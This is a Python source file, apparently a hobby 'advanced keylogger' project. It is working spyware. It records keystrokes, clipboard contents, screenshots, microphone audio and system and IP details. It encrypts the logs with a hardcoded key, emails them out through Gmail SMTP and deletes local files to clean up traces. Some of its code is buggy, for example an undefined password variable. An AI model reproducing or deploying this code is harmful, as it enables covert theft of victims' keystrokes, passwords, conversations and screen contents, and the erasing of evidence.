from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Collecting Computer Info
import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

# Sounds
from scipy.io.wavfile import write
import sounddevice as sd

# Encrypt data
from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# File names for storing collected information
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

# Encrypted file names
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

# Configuration variables
microphone_time = 10
time_iteration = 5
number_of_iterations_end = 3

# Email credentials
email_address = "myfirstadvancekeyloggerproject@gmail.com"
# password = "your 16 digit app password" --> Replace with your Gmail 16-digit app code

# User and recipient details
username = getpass.getuser()
toaddr = "myfirstadvancekeyloggerproject@gmail.com"

# Encryption key
key = "PAqiFAbWhAamnZFV24T8s55T9ovrvkIvbgc0uPtuvFw="

# File path setup
file_path = os.path.dirname(os.path.abspath(__file__)).replace("\\", "\\\\") + "\\"

# Function to send an email with an attachment
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment, 'rb') as attachment_file:
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment_file.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f"attachment; filename= {filename}")
        msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    s.sendmail(fromaddr, toaddr, msg.as_string())
    s.quit()

# Collect computer information
def computer_information():
    with open(file_path + system_information, "a") as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        try:
            public_ip = get("http://api.ipify.org").text
            f.write("Public IP address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get public IP address (likely most query)\n")
        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP address: " + ip_address + "\n")

# Collect clipboard information
def copy_clipboard():
    with open(file_path + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data + "\n")
        except Exception:
            f.write("Clipboard could not be copied\n")

# Record audio from the microphone
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + audio_information, fs, myrecording)

# Capture a screenshot
def screenshot():
    img = ImageGrab.grab()
    img.save(file_path + screenshot_information)

# Timer for keylogging and iteration
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        keys.append(key)
        count += 1
        currentTime = time.time()
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + keys_information, "w") as f:
            f.write("")

        screenshot()
        send_email(screenshot_information, file_path + screenshot_information, toaddr)
        copy_clipboard()

        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

    # Encrypt files
    files_to_encrypt = [file_path + system_information, file_path + clipboard_information, file_path + keys_information]
    encrypted_files_name = [file_path + system_information_e, file_path + clipboard_information_e, file_path + keys_information_e]

    count = 0
    for encrypting_file in files_to_encrypt:
        with open(files_to_encrypt[count], 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)

        with open(encrypted_files_name[count], 'wb') as f:
            f.write(encrypted_data)

        send_email(encrypted_files_name[count], encrypted_files_name[count], toaddr)
        count += 1

    time.sleep(120)

    # Clean up trace and delete files
    delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
    for file in delete_files:
        os.remove(file_path + file)

# Run the functions
computer_information()
copy_clipboard()
microphone()
screenshot()
